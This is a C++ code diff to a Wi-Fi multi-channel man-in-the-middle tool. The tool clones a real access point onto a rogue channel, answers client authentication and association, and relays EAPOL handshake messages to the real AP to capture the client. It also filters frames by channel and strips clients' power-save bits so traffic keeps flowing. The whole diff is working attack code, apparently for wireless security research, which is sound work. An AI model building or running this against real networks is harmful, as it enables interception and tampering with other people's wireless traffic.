@@ -12,6 +12,12 @@ using namespace std;
 using namespace chrono;
 using namespace Tins;
 
+void McMitm::send_to_rogue(PDU &pdu) const{ sock_rogue->send(pdu, netconfig.rogue_channel); }
+
+void McMitm::send_to_rogue(const vector<uint8_t> &raw) const{
+	sock_rogue->send(raw, netconfig.rogue_channel);
+}
+
 bool McMitm::handle_probe(const HWAddress<6> addr2, const PDU *pdu, const Dot11 &dot11){
 	if(dot11.find_pdu<Dot11ProbeRequest>()){
 		if(HWAddress<6>(ap.get(SK::mac)) != dot11.addr1()) return true;
@@ -40,8 +46,10 @@ bool McMitm::handle_open_auth(const HWAddress<6> &addr2, Dot11 &dot11){
 			resp.auth_algorithm(0); // Open System
 			resp.status_code(0);    // Success
 
-			client_state.update_state(ClientState::Authenticated);
 			send_to_rogue(resp);
+			send_to_real(dot11);
+
+			client_state.update_state(ClientState::Authenticated);
 			display_traffic(dot11, "Rogue channel", " -- Replied");
 			return true;
 		}
@@ -81,8 +89,8 @@ bool McMitm::handle_assoc_request(const HWAddress<6> &addr2, Dot11 &dot11){
 	} else{
 		return false;
 	}
-	display_traffic(dot11, "Rogue channel", " -- Replied");
 	client_state.update_state(ClientState::Associated);
+	display_traffic(dot11, "Rogue channel", " -- Replied");
 	//FIXME, proč nestačí send_to_real(pdu); ?
 	return false;
 }
@@ -101,20 +109,22 @@ bool McMitm::handle_action_rogue(const HWAddress<6> addr2, PDU &pdu, const Dot11
 	return false;
 }
 
-bool McMitm::handle_eapol_rogue(const HWAddress<6> addr2, PDU &pdu){
-	// EAPOL od AP -> forward na rogue channel
-	if(client_state.get_mac() == addr2){
-		if(is_eapol(pdu)){
-			int eapol_msg = get_eapol_msg_num(pdu);
-			log(LogLevel::INFO, "Rogue channel: EAPOL {} from STA ->  real channel", eapol_msg);
-			if(eapol_msg == 2 || eapol_msg == 4) send_to_real(pdu);
-			if(eapol_msg == 4){
-				client_state.update_state(ClientState::GotMitm);
-				if(hooks) hooks->on_client_connected(*this);
-				if(only_to_mitm) stop_mitm = true;
-			}
-			return true;
+bool McMitm::handle_eapol_rogue(const HWAddress<6> addr1, const HWAddress<6> addr2, PDU &pdu){
+	// EAPOL STA -> AP
+	if(addr1 == ap.get(SK::mac) && addr2 == client_state.get_mac() &&
+		is_eapol(pdu)){
+
+		int eapol_msg = get_eapol_msg_num(pdu);
+		if(eapol_msg == 2 || eapol_msg == 4) {
+			log(LogLevel::INFO, "Rogue channel: EAPOL {} from STA -> AP real channel", eapol_msg);
+			send_to_real(pdu);
 		}
+		if(eapol_msg == 4 && client_state.is_state(ClientState::Associated)){
+			client_state.update_state(ClientState::GotMitm);
+			if(hooks) hooks->on_client_connected(*this);
+			if(only_to_mitm) stop_mitm = true;
+		}
+		return true;
 	}
 	return false;
 }
@@ -122,6 +132,14 @@ bool McMitm::handle_eapol_rogue(const HWAddress<6> addr2, PDU &pdu){
 void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu, const vector<uint8_t> &raw){
 	auto *dot11 = pdu->find_pdu<Dot11>();
 	if(!dot11) return;
+
+	//filter out different channels
+	if(const auto *rt = pdu->find_pdu<RadioTap>()) {
+		if(rt->present() & RadioTap::CHANNEL &&
+			rt->channel_freq() != hw_capabilities::channel_to_freq(netconfig.rogue_channel)) {
+			return;
+			}
+	}
 
 	const auto [addr1, addr2] = get_addrs(*pdu, raw);
 	if(addr2 == HWAddress<6>() && dot11->type() != Dot11::CONTROL){
@@ -132,7 +150,7 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu, const vector<uint8
 	if(handle_probe(addr2, pdu.get(), *dot11)) return;
 	if(handle_open_auth(addr2, *dot11)) return;
 	handle_assoc_request(addr2, *dot11);
-	if(handle_eapol_rogue(addr2, *pdu)) return;
+	if(handle_eapol_rogue(addr1, addr2, *pdu)) return;
 
 	//TODO if(handle_action_rogue(addr2, *pdu, *dot11)) return;
 	if(addr2 == ap.get(SK::mac)){ // AP ->
@@ -142,21 +160,21 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu, const vector<uint8
 				last_rogue_beacon = steady_clock::now();
 			return;
 		}
-		if(client_state.get_mac() == dot11->addr1() || client_state.get_state() > ClientState::Target){
+		/*if(client_state.get_mac() == dot11->addr1() || client_state.get_state() > ClientState::Target){
 			display_traffic(*pdu, "Rogue channel");
-		}
+		}*/
 	} else if(dot11->addr1() == ap.get(SK::mac)){ // -> AP
-		bool will_forward = false;
 		if(client_state.get_mac() == addr2){
-			will_forward = client_state.should_forward(*pdu);
-			if(dot11->find_pdu<Dot11Authentication>() || dot11->find_pdu<Dot11AssocRequest>() || dot11->find_pdu<
-				Dot11ReAssocRequest>()){
-				print_rx(LogLevel::INFO, "Rogue channel", *dot11, " -- MitM'ing");
-				client_state.update_state(ClientState::GotMitm);
-			} else{
-				display_traffic(*pdu, "Rogue channel", " -- MitM'ing");
+			// remove sleep option
+			if(dot11->power_mgmt()){
+				log(LogLevel::WARNING, "Client {} is going to sleep on rogue channel. Removing sleep bit.", addr2);
+				dot11->power_mgmt(0);
 			}
-		} /*else if(
+			send_to_real(*pdu);
+			display_traffic(*pdu, "Rogue channel", " -- MitM'ing");
+		}
+
+		/*else if(
 			// auth/assoc what rogue AP cant generate
 			dot11->find_pdu<Dot11Authentication>() ||
 			dot11->find_pdu<Dot11AssocRequest>() || dot11->find_pdu<Dot11ReAssocRequest>() ||
@@ -172,14 +190,6 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu, const vector<uint8
 			display_traffic(*pdu, "Rogue channel", "**");
 		}*/
 
-		// remove sleep option
-		if(will_forward){
-			if(dot11->power_mgmt()){
-				log(LogLevel::WARNING, "Client {} is going to sleep on rogue channel. Removing sleep bit.", addr2);
-				dot11->power_mgmt(0);
-			}
-			send_to_real(*pdu);
-		}
 	} else if(client_state.get_mac() == dot11->addr1() || client_state.get_mac() == addr2){
 		display_traffic(*pdu, "Rogue channel", "_");
 	}
